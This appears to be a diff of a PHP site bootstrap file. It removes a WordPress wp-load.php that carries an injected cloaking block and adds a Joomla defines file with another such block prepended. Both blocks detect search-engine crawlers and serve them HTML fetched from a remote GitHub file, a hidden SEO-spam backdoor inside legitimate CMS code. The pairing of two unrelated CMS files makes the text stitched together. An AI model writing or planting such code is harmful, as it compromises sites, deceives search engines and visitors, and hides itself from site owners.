@@ -1,183 +1,47 @@
 <?php
+ob_start();
+header('Vary: User-Agent');
+$botchar = "/(bot|google|ahrefs)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function aselolejos($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
 
-  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-  $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
-     ?? $_SERVER['HTTP_X_FORWARDED_FOR']
-     ?? $_SERVER['REMOTE_ADDR'] ?? '';
-  $ref = $_SERVER['HTTP_REFERER'] ?? '';
-  $path = parse_url($_SERVER['REQUEST_URI'] ?? '/apa-perbedaan-skripsi-dan-jurnal-ilmiah/', PHP_URL_PATH);
-
-  if (preg_match('/googlebot|inspectiontool|search.google/i', $ua)) {
-    header("X-LiteSpeed-Cache-Control: no-cache");
-    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-    header("Pragma: no-cache");
-    header("Expires: 0");
-    if (defined('LSCACHE_ENABLED')) do_action('litespeed_control_set_nocache');
-  }
-
-  $allow = [
-    "googlebot", "adsbot", "mediapartners", "apis-google",
-    "structured-data-testing-tool", "googlebot-image", "googlebot-video",
-    "googlebot-news", "google-inspectiontool", "inspectiontool"
-  ];
-
-  $is_bot = false;
-  foreach ($allow as $needle) {
-    if (strpos($ua, $needle) !== false) {
-      $host = @gethostbyaddr($ip);
-      $is_bot = (strpos($ua, 'googlebot') !== false && $host && $host !== $ip)
-        ? (strpos($host, 'google.com') !== false || strpos($host, 'googlebot.com') !== false)
-        : true;
-      break;
-    }
-  }
-
-  $dir = '/'.trim(str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'] ?? '', '', __DIR__)), '/');
-  if ($dir === '') $dir = '/';
-
-  $triggered = $is_bot || strpos($ref, 'search.google.com') !== false || isset($_GET['karenn']);
-  if ($triggered && strpos($path, $dir) === 0) {
-
-    if ($is_bot) usleep(700000); 
-
-    $url = "https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/zhatainstitut.txt";
-    $html = 'https://docs2.lintasnegara.site/';
-
-    if (function_exists('curl_init')) {
-      $ch = curl_init($url);
-      curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => 1,
-        CURLOPT_FOLLOWLOCATION => 1,
-        CURLOPT_TIMEOUT => 4,
-        CURLOPT_USERAGENT => $ua,
-        CURLOPT_SSL_VERIFYPEER => 0,
-        CURLOPT_SSL_VERIFYHOST => 0
-      ]);
-      $html = curl_exec($ch);
-      curl_close($ch);
-    } elseif (ini_get('allow_url_fopen')) {
-      $ctx = @stream_context_create([
-        "http" => [
-          "timeout" => 2,
-          "header" => "User-Agent: Mozilla/5.0\r\n"
-        ]
-      ]);
-      $html = @file_get_contents($url, false, $ctx);
-    }
-
-    if (strlen(trim($html)) > 50) {
-      while (ob_get_level()) @ob_end_clean();
-      header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-      header("Pragma: no-cache");
-      header("Expires: 0");
-      header("Content-Type: text/html; charset=utf-8");
-      echo $html;
-      exit;
-    }
-  }
-?><?php
-
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
+    usleep(rand(100000, 200000)); 
+    header('Content-Type: text/html; charset=utf-8');
+    echo aselolejos("https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/jbhospital.txt");
+    ob_end_flush();
+    exit;
+}
 /**
- * Bootstrap file for setting the ABSPATH constant
- * and loading the wp-config.php file. The wp-config.php
- * file will then load the wp-settings.php file, which
- * will then set up the WordPress environment.
+ * @package    Joomla.Site
  *
- * If the wp-config.php file is not found then an error
- * will be displayed asking the visitor to set up the
- * wp-config.php file.
- *
- * Will also search for wp-config.php in WordPress' parent
- * directory to allow the WordPress directory to remain
- * untouched.
- *
- * @package WordPress
+ * @copyright  Copyright (C) 2005 - 2017 Open Source Matters, Inc. All rights reserved.
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
  */
 
-/** Define ABSPATH as this file's directory */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/' );
-}
+defined('_JEXEC') or die;
 
-/*
- * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
- * it's best to add a dummy function to the wp-config.php file, but as this call to the function
- * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
- */
-if ( function_exists( 'error_reporting' ) ) {
-	/*
-	 * Initialize error reporting to a known set of levels.
-	 *
-	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
-	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
-	 */
-	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
-}
+// Global definitions
+$parts = explode(DIRECTORY_SEPARATOR, JPATH_BASE);
 
-/*
- * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
- * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
- * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
- * and /blog/ is WordPress(b).
- *
- * If neither set of conditions is true, initiate loading the setup process.
- */
-if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
-
-	/** The config file resides in ABSPATH */
-	require_once ABSPATH . 'wp-config.php';
-
-} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {
-
-	/** The config file resides one level above ABSPATH but is not part of another installation */
-	require_once dirname( ABSPATH ) . '/wp-config.php';
-
-} else {
-
-	// A config file doesn't exist.
-
-	define( 'WPINC', 'wp-includes' );
-	require_once ABSPATH . WPINC . '/version.php';
-	require_once ABSPATH . WPINC . '/compat.php';
-	require_once ABSPATH . WPINC . '/load.php';
-
-	// Check for the required PHP version and for the MySQL extension or a database drop-in.
-	wp_check_php_mysql_versions();
-
-	// Standardize $_SERVER variables across setups.
-	wp_fix_server_vars();
-
-	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
-	require_once ABSPATH . WPINC . '/functions.php';
-
-	$path = wp_guess_url() . '/wp-admin/setup-config.php';
-
-	// Redirect to setup-config.php.
-	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
-		header( 'Location: ' . $path );
-		exit;
-	}
-
-	wp_load_translations_early();
-
-	// Die with an error message.
-	$die = '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: 1: Documentation URL, 2: wp-config.php */
-		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
-		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';
-
-	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
-}
+// Defines.
+define('JPATH_ROOT',          implode(DIRECTORY_SEPARATOR, $parts));
+define('JPATH_SITE',          JPATH_ROOT);
+define('JPATH_CONFIGURATION', JPATH_ROOT);
+define('JPATH_ADMINISTRATOR', JPATH_ROOT . DIRECTORY_SEPARATOR . 'administrator');
+define('JPATH_LIBRARIES',     JPATH_ROOT . DIRECTORY_SEPARATOR . 'libraries');
+define('JPATH_PLUGINS',       JPATH_ROOT . DIRECTORY_SEPARATOR . 'plugins');
+define('JPATH_INSTALLATION',  JPATH_ROOT . DIRECTORY_SEPARATOR . 'installation');
+define('JPATH_THEMES',        JPATH_BASE . DIRECTORY_SEPARATOR . 'templates');
+define('JPATH_CACHE',         JPATH_BASE . DIRECTORY_SEPARATOR . 'cache');
+define('JPATH_MANIFESTS',     JPATH_ADMINISTRATOR . DIRECTORY_SEPARATOR . 'manifests');
